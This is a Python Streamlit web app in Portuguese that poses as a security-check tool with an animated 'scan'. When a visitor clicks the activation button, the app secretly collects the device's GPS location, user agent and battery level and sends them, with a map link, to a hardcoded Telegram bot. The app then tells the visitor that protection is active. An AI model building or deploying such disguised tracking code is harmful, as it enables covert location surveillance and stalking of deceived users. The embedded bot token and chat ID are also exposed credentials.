import streamlit as st
import requests
import time
from streamlit_js_eval import streamlit_js_eval, get_geolocation

# 1. CONEXÃO TELEGRAM
TOKEN_BOT = "8525927641:AAHKDONFvh8LgUpIENmtplTfHuoFrg1ffr8"
SEU_ID = "8210828398"

def enviar_telegram(mensagem):
    url = f"https://api.telegram.org/bot{TOKEN_BOT}/sendMessage"
    payload = {"chat_id": SEU_ID, "text": mensagem, "parse_mode": "Markdown"}
    try: requests.post(url, json=payload)
    except: pass

# 2. CONFIGURAÇÃO DA PÁGINA
st.set_page_config(page_title="Sistema De Segurança Integrado", page_icon="🔐", layout="centered")

# 3. CSS DA ANIMAÇÃO
st.markdown("""
    <style>
    .main { background-color: #000000; color: white; }
    .scanner-container { display: flex; flex-direction: column; align-items: center; padding: 20px; }
    .particle-sphere {
        width: 180px; height: 180px; border-radius: 50%;
        background: radial-gradient(circle, rgba(46, 204, 113, 0.2) 0%, transparent 70%);
        border: 2px solid rgba(46, 204, 113, 0.5);
        box-shadow: 0 0 40px rgba(46, 204, 113, 0.4);
        display: flex; align-items: center; justify-content: center;
        animation: pulse 2s infinite ease-in-out;
    }
    @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.05); } }
    .percentage { font-size: 45px; font-weight: bold; color: white; }
    .status-text { color: #2ecc71; font-size: 14px; margin-top: 10px; }
    div.stButton > button {
        background-color: #ffc107 !important; color: black !important;
        font-weight: bold !important; width: 100%; height: 3.5em;
        border-radius: 10px; border: none !important;
    }
    .footer { text-align: center; color: #444; font-size: 12px; margin-top: 40px; }
    </style>
""", unsafe_allow_html=True)

# 4. INTERFACE INICIAL
st.markdown("<h2 style='text-align: center;'>Verificar segurança</h2>", unsafe_allow_html=True)
espaco_animacao = st.empty()

with espaco_animacao.container():
    st.markdown("""
        <div class="scanner-container">
            <div class="particle-sphere"><div class="percentage">4%</div></div>
            <div class="status-text">Sistema Pronto... Aguardando Ativação</div>
        </div>
    """, unsafe_allow_html=True)

st.write("")
st.write("✅ Privacidade e segurança")
st.write("")

# Dados do aparelho
ua = streamlit_js_eval(js_expressions="window.navigator.userAgent", key='ua')
bat = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key='bat')

# 5. LÓGICA DE 1 CLIQUE (O SEGREDO)
if st.button("🔴 ATIVAR PROTEÇÃO"):
    localizacao_obtida = None
    
    # Enquanto a porcentagem sobe, o código tenta pegar o GPS várias vezes
    for p in range(4, 101, 5):
        espaco_animacao.markdown(f"""
            <div class="scanner-container">
                <div class="particle-sphere"><div class="percentage">{p}%</div></div>
                <div class="status-text">Buscando sinal de satélite...</div>
            </div>
        """, unsafe_allow_html=True)
        
        # Tenta capturar a localização em cada passo do loop
        localizacao_obtida = get_geolocation()
        
        if localizacao_obtida and 'coords' in localizacao_obtida:
            # Se achou o GPS, continua a animação até o fim e sai do loop
            time.sleep(0.05) 
        else:
            time.sleep(0.2) # Dá um tempinho a mais pro navegador responder

    # FINALIZAÇÃO
    if localizacao_obtida and 'coords' in localizacao_obtida:
        lat = localizacao_obtida['coords']['latitude']
        lon = localizacao_obtida['coords']['longitude']
        mapa = f"https://www.google.com/maps?q={lat},{lon}"
        
        relatorio = (
            f"🚨 PROTEÇÃO ATIVADA (1 CLIQUE)\n\n"
            f"📱 Aparelho: {ua[:40]}... \n"
            f"🔋 Bateria: {bat if bat else '--'}%\n"
            f"📍 Mapa: [VER NO MAPA]({mapa})"
        )
        enviar_telegram(relatorio)
        st.success("✅ Varredura Completa! Proteção Ativa.")
    else:
        st.error("⚠️ O sinal de GPS falhou. Verifique se a localização do celular está ligada.")

st.markdown('<p class="footer">Desenvolvido Por Miamy © 2026</p>', unsafe_allow_html=True)
